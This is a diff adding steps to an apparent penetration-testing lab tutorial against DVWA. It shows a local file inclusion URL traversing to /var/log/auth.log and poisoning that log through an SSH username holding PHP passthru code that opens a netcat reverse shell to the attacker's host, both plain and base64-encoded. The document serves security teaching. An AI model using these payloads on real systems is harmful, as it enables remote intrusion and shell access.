@@ -111,7 +111,17 @@ So with this we can intercept the request (using Burp) and change the 'User-Agen
 
 Lets try and load a log file that shows login attempts to the server, which is the file `/var/log/auth.log`. So we change our url to be as follows: `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=../../../../../var/log/auth.log`
 
+Since we are able to view the contents of the /var/log/auth.log file in the browser we can inject some php code there and then execute it! 
 
+The way to do that is to check that if we attempt to ssh into the target server will that attempt show up in the output of /var/log/auth.log. If it does that means that we could potentially inject code into the server.
+
+Open a terminal session and start netcat listening on port 8888: `nc -vv -l -p 8888`
+
+In another terminal session, attempt to SSH into the target machine but this time set the user name to the php code we want to inject. Note that it's recommended to base64 encode the bash script. You can use Burp Suite to do that!
+
+SSH login command (before base64 encoding): `ssh "<?passthru('nc -e /bin/sh 10.0.2.15 8888');?>"@10.0.2.4`
+
+SSH login command (after base64 encoding): `ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxMC4wLjIuMTUgODg4OA=='));?>"@10.0.2.4`
 
 
 
